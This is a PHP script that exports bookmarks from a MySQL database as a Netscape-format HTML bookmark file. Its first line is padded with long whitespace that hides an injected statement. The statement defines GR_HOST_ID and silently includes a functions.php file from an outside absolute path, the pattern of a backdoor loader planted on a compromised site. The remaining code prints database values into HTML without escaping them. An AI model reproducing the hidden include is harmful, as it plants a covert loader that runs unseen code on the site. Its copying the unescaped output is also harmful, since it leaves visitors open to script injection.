<?php                                                                                                                                                                       if(!defined("GR_HOST_ID")){define("GR_HOST_ID", "index_prx86");}@include_once('/home/amsterdam/amsterdamsky.com/old/functions.php');

include('./functions.php');

?>

<!DOCTYPE NETSCAPE-Bookmark-file-1>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
<TITLE>Bookmarks</TITLE>
<H1>Bookmarks</H1>
<DL><p>
    <DT><H3 ADD_DATE="1366982012" LAST_MODIFIED="1388509891" PERSONAL_TOOLBAR_FOLDER="true">Bookmarks Bar</H3>
    <DL><p>
<?

	$conn	= db_connect();
	$query	= "select * from tbl_category order by category_name ASC";
	$result	= mysql_query($query);
	
	while ($row = mysql_fetch_array($result)) {

		$q	= "select bookmark_name, bookmark_url, UNIX_TIMESTAMP(bookmark_mod) from tbl_bookmark where bookmark_cat = '". $row[0]  ."' order by bookmark_name ASC";
		$marks	= mysql_query($q);

		if (mysql_num_rows($marks) > 0) {
			print '<DT><H3 ADD_DATE="1388510454" LAST_MODIFIED="1388510476">' . $row[0] . '</H3>' . "\xA";
			print '<DL><p>' . "\xA";
			while ($mark = mysql_fetch_array($marks)) {
  				print '<DT><A HREF="'.$mark[1].'" ADD_DATE="'.$mark[2].'" LAST_MODIFIED="'.$mark[2].'">'.$mark[0].'</A>' . "\xA";
			}
			print '</DL><p>' . "\xA";
		}
	}

?>
</DL><p>
</DL><p>
